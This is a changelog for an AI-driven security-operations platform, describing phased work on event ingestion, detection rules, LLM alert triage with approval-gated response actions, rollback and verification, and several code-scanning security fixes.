- **Phase C2 — Effective Permissions now resolves against a live posture snapshot.** The resolver is pure (snapshot → effective access), but the only production snapshot source was `_default_snapshot_loader` returning `{}` — so every live "what can this principal do?" call 412'd with "no policy snapshot ingested yet". New `services/api/app/services/effective_permissions/posture_loader.py` collects a real snapshot via the connector's `get_resource_config` read path: a new `POST /connectors/{id}/resource_config` endpoint (same vault-decrypt trust model as `/test` and federated `/query`) exposes it, and `HttpResourceConfigFetcher` + `collect_snapshot` assemble the resolver's snapshot. Coverage is explicit and honest — **Okta** is fully assembled here (user → groups → assigned apps → admin roles, then resolved), while **aws/azure/gcp/gws** consume a connector-provided *reconciled* snapshot (sentinel resource id `__posture_snapshot__`); a provider whose connector hasn't implemented that still 412s (we never fabricate a cloud snapshot). Wired into the endpoint behind `AISOC_EFFECTIVE_PERMISSIONS_LIVE` (default off → prior behaviour preserved), fail-soft to the 412 path on any collection error. 7 API unit tests + the connectors suite (751 passed). Claim-to-gate matrix +1 GATED (25 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase C4 — related alerts now auto-collapse into one ordered attack chain at fuse time.** Correlation grouped alerts into incidents by shared entity and the API could compute a chain per case on demand, but nothing formed/extended a chain **as alerts arrived** — so an analyst saw N separate alerts instead of "step 3 of an intrusion on host X that began 20m ago". New `services/fusion/app/services/attack_chain_grouper.py`: for each entity an alert touches (host/user/ip) it looks up (or mints) a stable `chain_id` in Redis with a rolling window, so a follow-on alert on the same entity — or a *different* entity sharing an IP — joins the same chain. Members are ordered by MITRE kill-chain stage (initial-access → … → impact), so the assignment's `position`/`stage` reflect where in the intrusion this alert sits, not its arrival order. The fusion engine attaches the assignment to `FusedAlert.enrichments["attack_chain"]` (chain_id, position, stage, prior_alert_ids, member_count) for the UI + triage agent. Fail-soft (Redis miss/outage ⇒ no assignment). 8 unit tests; full fusion suite 130 passed at 65% coverage. Claim-to-gate matrix +1 GATED (24 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase B4 — Business Context Rules now run on the live path (environment-specific noise reduction).** A leading AI-SOC differentiator — suppress alerts during a maintenance window, bump severity for production assets, route cloud alerts to the cloud team — existed as an engine + authoring UI in `services/api` but only ran in a dry-run preview; it never touched a live alert. New `services/agents/app/workers/business_context.py` applies the same `when`/`then` semantics (dotted-path fields + `eq/ne/lt/gt/contains/in/exists/...` comparators + `all/any/not`; effects `set_severity` / `route_to` / `tag` / `suppress`) in the auto-triage worker's post-fusion → pre-triage seam. A **suppress** rule drops the alert **before any triage spend**; severity/route/tag mutations flow into the alert the agent reasons over. Rules load from `AISOC_BUSINESS_CONTEXT_RULES_FILE` (mtime-reloaded), gated by `AISOC_BUSINESS_CONTEXT_ENABLED` (default on), fail-soft (bad/missing file ⇒ no rules applied, never an error into triage). The agents image can't import `services/api`, so the evaluator is a faithful, independently-tested re-implementation of the same documented semantics (unifying both call sites is a follow-up). 15 unit tests (`test_business_context_hotpath.py`, added to the CI agents gate). Claim-to-gate matrix +1 GATED (23 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase B3 — rollback is real, actions are post-verified, and approval SLA timers survive restarts.** Three "honest response" gaps closed. (1) **Real rollback:** every executor's `rollback()` previously returned a bare `True` — logging "rolling back" without calling the vendor. New `services/actions/app/services/rollback.py` performs the **real** reverse via the same clients (isolate→`lift_containment`/`unisolate_machine`, block_ip→`unblock_ip`/`unblock_ip_zone`, disable_user→`enable_user`/`unsuspend_user`, suspend_session→`unsuspend_user`) and returns an honest `RollbackResult` (`reversed_` / `simulated` / `supported`) — never a fake success; a failed reverse is reported, not hidden. `autonomy_safety.REVERSIBLE_ACTIONS` now imports from this module (single source of truth) and `test_rollback.py` gates the two sets so an action can't be declared reversible without a real reverse. (2) **Post-action verification:** new `services/actions/app/services/verification.py` re-queries the vendor to confirm the effect is actually present (`VERIFIED` / `FAILED` / honest `UNVERIFIED` when no probe or no creds) — a probe error is never a false `VERIFIED`. (3) **Durable approvals:** `services/slack-bot/app/services/timer_store.py` adds a Postgres-backed `TimerStore`; the `ApprovalTimeoutScheduler` persists pending SLA timers and `recover()` re-arms them on startup (firing overdue ones promptly), so a bot restart can no longer strand a forgotten approval forever. Fail-soft to in-memory when no DB. 25 new tests across actions + slack-bot. Claim-to-gate matrix +1 GATED (22 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase B2 — connector credentials now reach the SOAR executors, and the autonomy policy governs every real execution.** Two wiring gaps closed. (1) Executors read vendor-prefixed parameter keys (`cs_client_id`, `okta_domain`, `splunk_url` …) but connectors store schema field names (`client_id`, `domain`, `base_url` …) — nothing translated, so even fully-configured credentials never reached an executor and every action fell back to simulation. New `services/actions/app/services/credential_resolver.py` pins the per-vendor translation (15 vendors, connector-id aliases like `aws_security_hub`→`aws_security_groups`, `azure_defender`→`defender`; unknown fields dropped, never blindly forwarded), and `LiveActionRequest.auth_config` lets callers pass connector-style creds that the dispatcher resolves at the boundary. (2) The Phase 9a `autonomy_safety.decide()` policy existed but was never called on the live path (the 9b gap) — now every dispatch whose capability maps to an `ActionType` is governed **before** the executor is invoked: above-tier ⇒ downgraded to a dry-run preview; with dry-run disabled ⇒ `PENDING_APPROVAL` (executor never invoked); tier L0 ⇒ `BLOCKED`; explicit dry-run honoured unchanged; governance verdict attached to the result for the audit trail. Deployment tier via `AISOC_MATURITY_TIER` (default L1 — copilot). Also registers ten previously-missing vendor adapters (SentinelOne isolate, Entra/GWS disable-user, PAN-OS/FortiGate/Cloudflare block-ip, Jira/ServiceNow/PagerDuty create-ticket, Slack notify) so the agent can plan against them (19→29 builtins). 29 new/updated tests; full actions suite 224 passed at 64% coverage. Claim-to-gate matrix +1 GATED (21 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase B1 — the agent now auto-triages every alert off the stream (copilot default).** The core autonomy gap: investigations were manual/API-only — nothing consumed `aisoc.alerts.fused`, so "an agent that triages every alert" wasn't true out of the box. New `services/agents/app/workers/fused_alert_consumer.py` (`FusedAlertTriageWorker`) subscribes to the fused-alert topic and auto-triages each alert. **Copilot / dry-run is the default**: triage is read-only — it classifies (verdict + calibrated confidence), records the reasoning to the Investigation Ledger (best-effort), and **never dispatches a response** (proposed actions carry `requires_approval=True`; `response_dispatched` is always `False`). Tier selection is cost- and determinism-aware: cost-governor `DEDUPLICATED` reuses the cached verdict (a flood of identical alerts costs one triage), `CIRCUIT_OPEN`/`AISOC_DETERMINISTIC`/no-LLM-key falls to deterministic heuristic triage (`run_triage` — the air-gapped/CI default), otherwise LLM auto-triage with a deterministic fallback on failure. Wired into the agents lifespan (off unless `KAFKA_BOOTSTRAP_SERVERS` is set) + compose (`depends_on: kafka`). 9 unit tests (`test_fused_alert_worker.py`, added to the CI agents gate; the job now also installs `langgraph`). Claim-to-gate matrix adds a GATED row "Agent auto-triages every alert" (20 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase A4 — the behavioral (UEBA) model now feeds alert scoring in production (the three-model story is real).** `services/ueba` continuously scored every entity and emitted `ueba.anomalies`, but fusion never consumed them — so the Semantic-graph / Behavioral-UEBA / Knowledge-LLM story was only two models live. New `services/fusion/app/services/ueba_signal.py`: the fusion consumer subscribes to `ueba.anomalies` and caches the latest per-`(tenant, entity_type, entity_id)` anomaly in Redis with a TTL (behavioral signal is time-decaying); during `FusionEngine.process`, an alert looks up the highest anomaly across its own entities (username→user, hostname→device, src/dst IP→ip) and `apply_ueba_boost` raises the alert's confidence (risk-scaled, label recomputed) and anomaly score, recording an explainable `ueba_anomaly` factor. Fail-soft throughout (Redis miss/outage or malformed message ⇒ no boost, no raise). 10 fusion unit tests; full fusion suite 122 passed at 64% coverage. Claim-to-gate matrix adds a GATED row "Three-model AI: behavioral (UEBA) model feeds alert scoring" (19 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase A3 — the default cold-boot stack is complete ("just works").** A plain `docker compose up` previously started the core services but left the connector runtime behind a `connectors` profile and graph-at-ingest OFF, so a fresh install wasn't the full spine. Now `docker-compose.yml` ships the connector runtime in the default profile (it idles harmlessly with no configured instances) and enables graph-at-ingest by default on `ingest-worker` (`AISOC_GRAPH_ENABLED=true` + Neo4j env + `depends_on`; the writer soft-fails if Neo4j is unreachable, so it never blocks ingest). `integration.yml` gains a Phase A3 gate asserting the default boot ships the connectors service **and** ingest enabled the graph writer **and** the Neo4j graph has nodes after the spine flowed — so combined with A1 (lake) and A2 (detection), a cold `up` is proven end-to-end: ingest → OCSF normalize → Kafka → ClickHouse lake + entity graph + detection engine → fused alert row. Claim-to-gate matrix: "`pnpm aisoc:demo` boots the real stack" PARTIAL → GATED (18 GATED / 10 PARTIAL / 1 NO GATE).
- **Phase A2 — the executable detection corpus now fires on the live event stream.** The reality audit's second SIEM gap: ~939 executable rules existed but only ran in CI fixture-replay — nothing evaluated them against ingested events, so any telemetry that wasn't a vendor-asserted finding (the promoter's job) never became an alert. New `services/fusion/app/services/detection_engine.py` loads the native corpus exported to `app/data/detection_ruleset.json` (817 rules, by `scripts/export_detection_ruleset.py`) and evaluates each ingested event's connector-normalized fields — recovered from `ocsf_event["raw_data"]`, the shape the specs were authored against — via a **vendored, parity-gated** copy of the canonical `match_when` matcher (`app/services/detection_matcher.py`; `test_detection_matcher_parity.py` asserts byte-for-behaviour agreement with `scripts/generate_detections.py` over every committed fixture). Each firing rule becomes a `RawAlert` routed through the normal fusion dedup/correlate/persist pipeline. Product routing is fuzzy (correctness-first: unknown product ⇒ evaluate all). Gates: `integration.yml` posts an event matching `aws-root-account-login` and asserts the alert appears; `validate-detections.yml` drift-checks the exported ruleset; 16 fusion unit tests. Claim-to-gate matrix adds a GATED row "Detection rules fire on the live event stream" (17 GATED / 11 PARTIAL / 1 NO GATE).
- **Phase A1 — the ClickHouse event lake is now populated from the live stream.** The reality audit's central SIEM gap: the `aisoc.raw_events` lake table and its `/api/v1/lake/sql` read API existed with **no writer**, so every hunt/query ran against an empty warehouse. New `services/fusion/app/services/lake_writer.py` (`LakeWriter`) archives every normalized OCSF event from the `aisoc.raw_events` Kafka topic into ClickHouse — mapping the OCSF envelope to the lake columns (IPv4→IPv4-mapped-IPv6 coercion, `DateTime64` binding, MITRE/IOC extraction), batched by size **or** age, and **fail-soft** (a ClickHouse outage drops the batch and logs, never crashes the consumer). Archival is independent of promotion (a non-promoted Medium event is still queryable), and a background periodic-flush ticker guarantees a low-traffic batch is never stranded. Wired into the fusion consumer + lifespan; `docker-compose.yml` fusion service gets ClickHouse env + `depends_on`. `integration.yml` gains a Phase A1 gate asserting `SELECT count() FROM aisoc.raw_events > 0` after the spine ingests, against a live ClickHouse container (verified locally: a real INSERT round-trips). Claim-to-gate matrix adds a GATED row "Ingested events land in the queryable ClickHouse lake" (16 GATED / 11 PARTIAL / 1 NO GATE). At-least-once with a deterministic `event_id` (MergeTree does not dedup; the gate asserts queryability, not exact-once).

### Security

- **CodeQL (`security-and-quality`) alert cleanup.** Resolved the open code-scanning alerts surfaced by the fresh `security-and-quality` analysis. Real code fixes: (1) **`go/clear-text-logging` + `go/log-injection`** in `services/ingest/internal/enrichment/shodan.go` — the failure path logged the raw transport `err` (which can carry the request URL with the Shodan API key or response-derived data) alongside an unsanitized, attacker-influenceable `ip`; now it logs only a control-char-stripped IP (`sanitizeLogValue`) and never the error object. (2) **`py/stack-trace-exposure`** in `services/actions/app/api/router.py` — the action record echoed `str(exc)` back to the API caller; it now returns only the exception *type* and logs full detail server-side. (3) **`py/clear-text-storage-sensitive-data`** in `scripts/connector_conformance.py` — a false positive where the integer count of `secret`-type fields tripped CodeQL's sensitive-name heuristic; renamed the count to `vaulted` (accurate — those fields are vault-encrypted) so the matrix write is no longer misread as clear-text secret storage. (4) **`py/ineffectual-statement`** (×7) — Protocol/abstract method bodies written as bare `...` now use docstring bodies. (5) **`py/empty-except`** (×3) — silent `except: pass` blocks now carry an explanatory comment. The 20 `py/request-without-cert-validation` findings are the connector/appliance clients' TLS controls, which **default to `verify=True`** and only disable verification when an operator explicitly opts in (required for on-prem SIEM/firewall appliances with self-signed/internal-CA certs); these are triaged as accepted-risk (secure-by-default, explicit opt-in), with CA-bundle certificate pinning tracked as the recommended future alternative.

### Added

- **Phase 12 — observability + governance (completes the World-Class Hardening Program's 0–12 phase checklist).** Two halves of "run this next to your crown jewels": (1) **Observability** — every service under `services/` declares its reliability posture in `docs/operations/slos.yaml` (availability + p95 latency + golden signals; all 18 services covered — 16 SLOs + 2 exempt), gated by `scripts/check_slos.py` so a new service can't ship without an SLO. `docs/operations/observability.md` documents the four golden signals and the single OpenTelemetry trace that spans `ingest → fusion → realtime → api → agents → actions`. (2) **Governance** — new `GOVERNANCE.md` (roles, lazy-consensus decision-making, the maintainer path, and an explicit vendor-neutral-home intent), `MAINTAINERS.md`, and a **Developer Certificate of Origin** sign-off requirement added to `CONTRIBUTING.md`. `scripts/check_governance.py` + `governance.yml` gate that the governance surface (governance/maintainers/security/CoC/trademark/DCO/SLOs/observability) exists and is non-trivial, so it can't silently rot. With this, all 13 phases (0–12) have landed; the claim-to-gate matrix stands at **15 GATED / 11 PARTIAL / 1 NO GATE** (the last NO GATE, wet-eval live-agent tables, needs a budgeted live run — Phase 4c).
- **Phase 11 — OpenAPI breaking-change gate.** `check-openapi.yml` proved the spec matches the code (drift) but had **no breaking-change semantics** — a PR could delete an endpoint, remove a response field, tighten a request body, or drop an enum value with every check green while every generated SDK client silently broke (the reality-audit `NO GATE` row). New `scripts/openapi_diff.py` (pyyaml-only) classifies the changes between two specs as breaking vs non-breaking *from an existing client's perspective*: removed path/operation/schema/property, changed property type signature, optional→required, a new required field on a request-shaped schema, a removed enum value, or a new required parameter. New `openapi-breaking.yml` diffs the PR's `docs/openapi.yaml` against the base branch and fails on any breaking change; a deliberate breaking release ships with a version bump + a CHANGELOG BREAKING note and `--allow-breaking`. 15 detector tests (`tests/test_openapi_diff.py`) prove every breaking class is caught **and** that safe additive changes (new path, new optional field, new enum value, new response field) are *not* flagged — a breaking-change gate that cries wolf gets disabled. Claim-to-gate matrix: "OpenAPI stability for 3 SDKs + MCP" NO GATE → GATED, and the **ratchet ceiling lowered 2 → 1** (15 GATED / 11 PARTIAL / 1 NO GATE — only the wet-eval live-agent scoreboard tables remain, closing in Phase 4c with a budgeted live run). Per-language SDK generated-client contract-drift is tracked as 11b.
- **Phase 10 — connector runtime-contract conformance suite + published matrix.** The reality audit left the "live Test connection" click-and-connect claim with **NO gate at all**, and the schema/vault claim only partially gated. New `scripts/connector_conformance.py` + `services/connectors/tests/test_conformance.py` gate the runtime contract across **all 69 connectors**: every connector must implement `test_connection` as an async coroutine (the contract behind the "live Test connection" button), implement `fetch_alerts` as an async coroutine, declare only valid `Capability` verbs, and **mark every secret-shaped field `type="secret"`** — a field named `api_key`/`token`/`password` rendered as a plain `string` would be stored outside the vault, the exact leak this check prevents. The published `docs/connectors/conformance-matrix.md` (69/69 conform) is drift-gated by `--check`, so a new connector cannot land without conforming and the matrix can't diverge from the registry. Claim-to-gate matrix: "Connectors: live Test connection" NO GATE → PARTIAL, and the **ratchet ceiling lowered 3 → 2** (14 GATED / 11 PARTIAL / 2 NO GATE). Detection-content lifecycle is already gated by Phase 4a (DAC candidate-rule) + 4b (truth table). Live-vendor sandbox smoke + rate-limit/checkpoint durability are tracked as 10b in `docs/audit/PROGRESS.md`.
- **Phase 9a — autonomy-safety policy + honest rollback contract + scorecard.** The reality audit found three holes behind "L0-L4 automation maturity gates every action": dry-run was opt-in (a mis-configured caller executes for real), ~15 executor `rollback()`s silently `return True` with no reverse vendor call (the platform claimed to reverse containment it never did), and there was no post-action verification. New `services/actions/app/services/autonomy_safety.py` closes them at the policy layer: `decide()` makes **dry-run the safe default** — anything not explicitly permitted to auto-execute is previewed (`DRY_RUN`), never silently executed; CRITICAL blast never auto-executes; HIGH only at L4 with a whitelist entry AND the `AISOC_ALLOW_HIGH_BLAST_AUTO` break-glass flag. `rollback_capability()` with a **pinned `REVERSIBLE_ACTIONS={block_ip}`** set makes the rollback claim honest and bounded — a caller learns "this cannot be auto-reversed" instead of a silent `True`, and the set can't grow without a conscious edit + real reverse implementation. Every unattended containment (`AUTO`, blast ≥ MEDIUM) sets `requires_verification`, and `AutonomyScorecard` counts executions that were never verified — and executions of irreversible actions — as **visible gaps** rather than assumed-away. 16 tests (`services/actions/tests/test_autonomy_safety.py`, in the actions coverage matrix). Enforcement-wiring of `decide()` into the live `/dispatch` + `submit_action` router, rewriting the silent-`return True` executor rollbacks, real vendor verifiers, and a durable approval-SLA timer table (replacing the in-memory `approval_timeout.py`) are tracked as 9b in `docs/audit/PROGRESS.md`.
- **Phase 8 — LLMOps: prompt registry, model pins, response cache, structured-output validation.** A coherent `services/agents/app/llm/` LLMOps layer, all dependency-light and gated. (1) **Prompt registry** (`prompt_registry.py`) — every production prompt is a named, versioned, sha256-hashed artifact; the committed `prompts.lock.json` pins version→hash, and `scripts/check_prompt_lock.py --check` (wired into the CI lint job) fails when a prompt's text changes without a version bump + lock regeneration. This makes the `AGENTS.md` "prompt change ⇒ re-grade the eval harness" rule *enforceable* — you can no longer edit a prompt silently. (2) **Model pins + provider fallback** (`model_pins.py`) — logical roles pinned to concrete models with ordered fallback chains that ALWAYS terminate in the deterministic tier (env-overridable primaries, but the deterministic floor is gate-enforced), replacing the scattered `os.getenv("...", "gpt-4o-mini")` defaults. (3) **Content-addressed response cache** (`response_cache.py`) — keyed on sha256(model+prompt+input) with field separation and LRU eviction; safe under the determinism contract (a hit is byte-identical). (4) **Fail-closed structured-output validation** (`structured_output.py`) — strips code fences/prose, parses JSON, validates against a caller schema, and on ANY failure returns a deterministic fallback rather than propagating a half-parsed object into an autonomy decision. 15 tests (`services/agents/tests/test_llm_ops.py`, appended to the CI agents gate). Migration of the inline agent prompts to `registry.get()` is tracked as 8b. Doc: `apps/docs/docs/concepts/llmops.md`.
- **Phase 7a — unified multi-model router with tier attribution + a determinism contract.** The reality audit confirmed the knowledge graph is already built at ingest (v8 T1.1, `services/ingest/internal/graph/`); the genuine Phase 7 delta was the *model router*. Before it, the deterministic→LLM fallback was reimplemented independently in NL query, playbook drafting, explain, copilot, and each sub-agent — no single audit point for which model answered or why. New `services/agents/app/routing/model_router.py` is that place: a `ModelRouter` that escalates deterministic → ML → LLM only when the cheaper tier is under-confident, and attributes every decision (`tier`, `model_used`, `attribution` trail, `tiers_considered`, `escalation_blocked_reason`). It **never silently uses the LLM** — a skipped or blocked LLM tier (no key, air-gap, deterministic mode, governor circuit open, or a tier error) is always recorded. Introduces the canonical **`AISOC_DETERMINISTIC`** flag and composes with the existing `CostGovernor` circuit breaker: either one forces deterministic-only, in which case the router is reproducible (same input → identical decision). 12 tests (`services/agents/tests/test_model_router.py`, appended to the CI agents gate) prove tier selection, attribution, the no-silent-LLM property, graceful LLM-failure degradation, and the determinism contract. Doc: `apps/docs/docs/concepts/model-router.md`. Remaining Phase 7 enrichments (posture collection, effective-permissions snapshot loader, bi-temporal validity, fusion-time ContextBundle) are tracked as 7b+ in `docs/audit/PROGRESS.md`.
- **Phase 6 — performance + cost, both gated.** Two cheap, non-flaky gates in a new `.github/workflows/perf.yml`. (1) **Throughput** — `scripts/perf/throughput_harness.py` runs the *real* fusion hot path (`promote_normalized_event`) over a deterministic 20k-event synthetic corpus and reports events/sec + p50/p95/p99 per-event latency (measured ~250k eps on commodity hardware). The gate asserts a **generous regression floor** (1,000 eps — a >200× margin) so it fires only on a catastrophic regression such as an I/O call slipping onto the hot path, never on shared-runner jitter; it is explicitly a regression floor, not a production SLO. (2) **Cost** — `scripts/storage_cost_model.py` is a deterministic tiered-storage $/TB model (hot ClickHouse block 30d / warm object 60d / cold archive 275d, 8× ZSTD); the committed worked example (`docs/decisions/storage-cost-model.json`: ≈ $902/mo and ≈ $30/raw-TB at 1 TB/day) is drift-gated by `--check`, so the number can never silently diverge from the rate card. Rate-card values are labelled reference list prices to verify per provider/region — the value is the methodology, not the exact dollars. `docs/decisions/0005-storage-consolidation.md` (ADR) records the three-tier decision (keep ClickHouse-only hot; do not add a second hot engine) and cites the gated model.
- **Phase 5 — data spine correctness: schema registry + dead-letter queue + lineage.** The reality audit's load-bearing gap: the fusion consumer logged a warning and **silently dropped** any malformed message — silent data loss. Now every message is schema-validated against a versioned envelope registry (`services/fusion/app/services/event_schema.py`: `aisoc.raw_events` and `aisoc.alerts.raw`, each pinned to `v1`, with a drift-guard test so the wire contract can't move unnoticed) *before* the promoter sees it. Anything that fails — non-object payload, unknown `schema_version`, missing `ocsf_event`, non-UUID tenant, or a RawAlert that fails deep Pydantic validation — is routed to a **fail-soft dead-letter queue** (`services/fusion/app/services/dlq.py`: `LoggingDLQ` default, `InMemoryDLQ` for tests, `KafkaDLQ` republishing to `aisoc.alerts.dlq`) with its reason, schema version, source-event lineage, and a truncated payload, instead of vanishing. `safe_record` guarantees a DLQ that itself throws never crashes the consumer. Each processed alert logs `fusion.lineage` (source event id + schema version). 21 new tests (`test_event_schema.py`, `test_dlq.py`, `test_consumer_dlq.py`) prove a valid event is processed with an empty DLQ, every poison shape is captured (not dropped), and a failing DLQ sink doesn't crash the consumer; full fusion suite 92/92 at 59% coverage (floor 48). Idempotency (AlertSink dedup fingerprint, Phase 3.1) and event-time watermarking are already present; backfill/replay-from-offset is tracked as 5b in `docs/audit/PROGRESS.md`.
- **Phase 4a — the Detection-as-Code gate is no longer circular.** The reality audit's #1 circular gate: the detection-proposal promote path shelled out to `run_evals.py` **without ever passing the proposed rule body**, so "passed" meant the repo-wide substrate MITRE accuracy didn't move — a value independent of the rule under review. A blind rule (matches nothing) or a noisy rule (matches everything) sailed through its own exam. New `services/api/app/services/detection_eval.py::evaluate_candidate_rule` runs the *candidate `rule_body` itself* through the **real** runtime engine (`rule_engine.execute_rule`) against caller-supplied positive/negative fixtures: it must fire on every positive and stay silent on every negative. New `POST /detection-proposals/{id}/evaluate-rule` stores the verdict under `eval_result["candidate_rule"]`, and `POST /decide` (approve) now **requires** it — a benchmark-only pass is no longer sufficient. `services/api/tests/test_detection_eval.py` (6 tests) is the mutation test that proves the gate rejects a blind rule, rejects a noisy rule, rejects a no-positive-fixture rule, and that the verdict genuinely depends on the rule body. Claim-to-gate matrix: DAC row PARTIAL(circular) → GATED.
- **Phase 4b — detection content truth table (honest coverage).** The README advertised "6000+ imported detection rules", but ~97% live under `_quarantine/` (`enabled: false`) because their upstream query language (SPL / YARA-L / CAR pseudocode) does not execute on the engine. New `scripts/detection_truth_table.py` walks `detections/` and classifies every rule **executable** (fires today) vs **non-executable** (provenance/coverage only), rendering `docs/detections/truth-table.md`. The honest headline: **939 executable** rules (861 native + 77 sigma-imported + 1 community) of 6975 on disk; 5921 quarantined, 115 disabled. `--check` gates the doc in `validate-detections.yml` so the number can never quietly drift from reality, and the README now cites the executable figure for *coverage* (the on-disk figure only describes the imported *library*). Claim-to-gate matrix: 6000+-imported row PARTIAL → GATED (14 GATED / 10 PARTIAL / 3 NO GATE). The LLM-dependent half of Phase 4 (live-agent Tier-1 eval, hallucination/calibration/abstention, model matrix, 150-payload prompt-injection adversarial) is tracked as 4c+ in `docs/audit/PROGRESS.md`.
- **Phase 3.4 — cross-store tenant isolation, now proven against live containers.** The offline `isolation.yml` gate proved each read path *constructs* a tenant scope; it could not prove the scope actually isolates. New `.github/workflows/isolation-live.yml` + `tests/isolation/test_live_stores.py` seed tenant A and tenant B in **real containers** (Neo4j, Redis, ClickHouse, Redpanda/Kafka) and assert a read as A returns zero B data. ClickHouse runs the **production** `lake_sql.rewrite_for_tenant` rewriter against a live warehouse (verified: `SELECT … FROM aisoc.raw_events` becomes `… WHERE tenant_id = '<A>'`, so B's rows never return); Neo4j uses the `tenant_id` property filter; Redis uses the `aisoc:t:<tenant>:*` keyspace namespacing; Kafka replays the `graph_ws` per-tenant envelope filter. Every test also asserts the *unscoped* read sees both tenants, so a scoped pass can never be vacuous on an empty store. The isolation registry (`tests/isolation/stores.py`) flips Neo4j/Redis/ClickHouse/Kafka from `container_pending` → `container_gated`, and the claim-to-gate matrix moves "Cross-tenant isolation (Qdrant/Neo4j/Redis/ClickHouse/Kafka)" PARTIAL → GATED (12 GATED / 12 PARTIAL / 3 NO GATE). The heavy-demo-stack items (Playwright real-stack E2E, demo time-to-first-investigation budget) are tracked as non-blocking 3.5+ in `docs/audit/PROGRESS.md`.
- **Phase 3.3 — upgrade-safety gate ("people upgrade; nothing tested it").** New `upgrade` job in `integration.yml` (matrix `v7.5.0 → HEAD` and `v7.3.1 → HEAD` against a real Postgres 16): install a prior release's migration set, seed 250 probe rows on that released schema, then apply HEAD's migration set — the actual self-host upgrade path — and assert the seeded rows survive **and** every HEAD migration applied. The signal this adds beyond the existing fresh-apply job is **destructive-migration detection**: a migration that drops or rewrites existing data fails here even though it applies cleanly on an empty database. The `v7.3.1 → HEAD` leg lands 8 incremental migrations on a pre-existing populated schema (verified locally: 250/250 rows survived, 55/55 migrations tracked). Uses `git checkout <ref> -- services/api/migrations` with an `rm -rf` first so the released set is exact (a `checkout … -- path` alone leaks HEAD-only files and silently degrades to a fresh apply).
- **Phase 3.2 — Postgres-outage chaos gate (fail-soft + self-heal).** Extends the `integration.yml` spine job with a second chaos scenario beyond the consumer-kill test: kill Postgres mid-stream, assert the fusion consumer keeps running (the `AlertSink` degrades to "fused alerts still stream over Kafka/WS, persistence dropped for the outage window" instead of crashing the worker), then restart Postgres and assert a *fresh* event persists — proving the sink's asyncpg pool and the API's SQLAlchemy pool both self-heal with no service restart. Distinct event titles side-step fusion's in-memory dedup so the post-restart event is a genuine fresh persist. Verified locally against a real Postgres 16 before gating (persist during outage → `None` with no raise; first persist after restart → row written). `scripts/integration/spine_test.py` polling now swallows transient HTTP errors during the recovery window so a 5xx blip while the API reconnects extends the poll rather than failing the run.
- **Phase 3.1 — the event spine is now continuous, and CI proves it with real containers.** The reality audit found two silent gaps in the product's central claim: ingest published normalized OCSF events to `aisoc.raw_events` that nothing consumed, and fusion published to `aisoc.alerts.fused` that nothing persisted — a raw event could never become an alert row without a human calling the API. Both bridges now exist in `services/fusion`: a deterministic promotion policy (`app/services/promoter.py` — OCSF Findings-category events and `severity_id >= 4` telemetry become `RawAlert`s; everything else is left to the detection engine by design) and a fail-soft, idempotent Postgres `AlertSink` (`app/services/alert_sink.py` — dedup-fingerprint-guarded insert, duplicates never persisted, DB outage degrades instead of crashing the consumer). New `.github/workflows/integration.yml` gates three claims against real containers, no mocks: (1) **spine** — `POST /v1/ingest/batch` → OCSF normalize → Kafka → fusion → WebSocket `alert.fused` frame + Postgres row via `GET /api/v1/alerts`, plus duplicate suppression and a chaos step (kill the fusion consumer mid-stream, produce, restart, assert zero event loss) — driver: `scripts/integration/spine_test.py`; (2) **migrations** — the full SQL chain applies on fresh Postgres 16, re-run is a no-op (new `AISOC_MIGRATIONS_STRICT=1` mode fails CI on any failed migration), and the UEBA alembic chain round-trips upgrade → downgrade → upgrade; (3) **backup-restore** — `scripts/backup.sh`/`restore.sh` against Postgres + MinIO: seed → backup → destroy → restore → assert full integrity, with measured RTO published to the job summary. 20 new fusion unit tests cover the mapping/skip logic (`test_promoter.py`, `test_alert_sink.py`); full fusion suite 71/71.

### Fixed


- **Hosted demo API 500s from stale Postgres pool + broken waitlist funnel (QA 2026-07-19).**
  Live `/health` showed `demo_bootstrap.last_error_type=create_seed:ConnectionDoesNotExistError`
  after 22 attempts — Fly Postgres autostop closed pooled sockets and every
  subsequent checkout 500ed (`/api/v1/auth/login`, `/metrics/*`, `/alerts/*`,
  `/cases` → 503). Fixes: (1) `pool_pre_ping=True` + `pool_recycle=300` on the
  SQLAlchemy engine; (2) demo self-heal bootstrap now disposes the pool after
  every disconnect, splits create_all / SQL migrations / seed into separate
  steps, and surfaces stage-tagged errors on `/health`; (3) demo-mode middleware
  allowlists `POST /api/v1/waitlist/signup` so the managed-instance conversion
  funnel on tryaisoc.com is no longer 403ed for every visitor.
- **Demo bootstrap `create_all` AttributeError (QA follow-up).** After Fly Postgres
  was restarted, `/health` still reported `create_all:AttributeError` because
  `AsyncConnection.execution_options(...)` is a coroutine and was chained into
  `.run_sync` without `await`. Await the options object first; pin in
  `test_database_pool.py`. Unblocks `published_replays` create + `/r/demo-lockbit`.
- **Canonical `/r/demo-lockbit` missing after re-seed short-circuit.** When
  INC-RT-* cases already exist, `_seed_in_flight_investigation` returned early
  and never created `published_replays`. Now that path still ensures the
  canonical replay; bootstrap only marks `done` after verifying the slug.


- **Out-of-the-box 500 from schema drift on migration-bootstrapped installs (#492).**
  `docker-compose.yml` mounts `services/api/migrations` into
  `/docker-entrypoint-initdb.d`, so a fresh compose stack builds Postgres from
  the `001_init.sql` lineage — which created `detection_rules` in its
  pre-refactor shape (`rule_type`/`rule_content`/`hit_count`/`last_hit_at`) and
  `cases` without `resolution`/`lessons_learned`. The current `DetectionRule`
  and `Case` models query the refactored columns, so every default install
  served `UndefinedColumnError` 500s (e.g. `GET /api/v1/detection/tuning`) and
  `seed_demo` failed on `cases.resolution`. New
  `services/api/migrations/046_detection_rules_cases_schema_drift_fix.sql`
  reconciles both tables with the models — additive, fully idempotent
  (`ADD COLUMN IF NOT EXISTS`), and dual-lineage safe (the `create_all` path is
  a no-op; the legacy path backfills `rule_body`/`rule_language` from the old
  columns and drops the stale `rule_content NOT NULL` under an
  `information_schema` guard so ORM inserts succeed). New
  `services/api/tests/test_schema_drift_046.py` pins the fix and adds a forward
  guard asserting the migration lineage covers every column both models declare.
